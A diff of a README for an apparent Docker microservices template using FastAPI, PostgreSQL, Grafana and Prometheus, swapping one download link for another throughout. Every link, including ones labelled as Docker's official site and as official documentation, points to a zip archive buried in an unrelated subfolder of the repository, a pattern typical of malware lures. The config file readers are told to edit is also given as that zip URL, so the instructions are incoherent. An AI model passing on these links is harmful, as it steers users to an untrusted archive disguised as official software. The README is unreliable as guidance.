@@ -1,6 +1,6 @@
 # 🚀 docker-microservices-template - Build and Run Microservices Easily
 
-[![Download](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
+[![Download](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
 
 ## 📦 Overview
 The docker-microservices-template provides a complete setup for a microservices architecture using Docker. It combines FastAPI, PostgreSQL, and powerful monitoring tools like Grafana and Prometheus. This template is designed to help you get started quickly with production-ready services.
@@ -10,7 +10,7 @@ The docker-microservices-template provides a complete setup for a microservices 
 ### 🌐 Prerequisites
 Before you start, ensure you have the following installed on your computer:
 
-- **Docker**: This is essential for running containers. Download it from [Docker's official site](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip).
+- **Docker**: This is essential for running containers. Download it from [Docker's official site](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip).
 - **Docker Compose**: This helps you manage multi-container applications. It usually comes bundled with Docker Desktop.
 
 ### 🛠️ System Requirements
@@ -19,7 +19,7 @@ Before you start, ensure you have the following installed on your computer:
 - Network Connection: Required for downloading containers and images
 
 ## 💻 Download & Install
-To download the docker-microservices-template, please visit this page: [Download the latest release](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip).
+To download the docker-microservices-template, please visit this page: [Download the latest release](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip).
 
 ### 📥 Installation Steps
 1. **Download**: Click on the link above to access the Releases page and choose the latest version. 
@@ -45,7 +45,7 @@ The project is organized into directories that make it easy to understand:
 - **Monitoring Tools**: Real-time monitoring with Grafana and Prometheus.
 
 ## ⚙️ Customization
-You can customize the services to fit your needs. Modify the `https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip` file to change settings such as:
+You can customize the services to fit your needs. Modify the `https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip` file to change settings such as:
 
 - Ports
 - Environment variables
@@ -55,16 +55,16 @@ You can customize the services to fit your needs. Modify the `https://raw.github
 If you encounter issues, consider the following solutions:
 
 - **Docker Not Running**: Ensure that Docker Desktop is up and running before executing commands.
-- **Port Conflicts**: If you have other applications using the same ports, change the ports in the `https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip` file.
+- **Port Conflicts**: If you have other applications using the same ports, change the ports in the `https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip` file.
 
 ## 📄 Documentation
 For detailed information about each component, refer to the official documentation of:
 
-- [Docker](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [FastAPI](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [PostgreSQL](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [Grafana](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [Prometheus](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
+- [Docker](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [FastAPI](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [PostgreSQL](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [Grafana](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [Prometheus](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
 
 ## 🎉 Contributions
 This project welcomes contributions. If you would like to contribute, please open issues on the GitHub page for discussion, or submit pull requests for review.
@@ -82,10 +82,10 @@ To start monitoring your applications, access Grafana at `http://localhost:3000`
 - Password: admin (You will be prompted to change this on the first login)
 
 ## 🔗 Useful Links
-- [Docker Hub](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [FastAPI Documentation](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [PostgreSQL Documentation](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [Grafana Documentation](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
-- [Prometheus Documentation](https://raw.githubusercontent.com/swilah/docker-microservices-template/main/langgraph-rag-assistant/app/ingestion/template-docker-microservices-2.2.zip)
+- [Docker Hub](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [FastAPI Documentation](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [PostgreSQL Documentation](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [Grafana Documentation](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
+- [Prometheus Documentation](https://github.com/swilah/docker-microservices-template/raw/refs/heads/main/langgraph-rag-assistant/app/ingestion/template-microservices-docker-v1.4.zip)
 
 Now, you are ready to build and run your microservices using the docker-microservices-template. Enjoy your development journey!
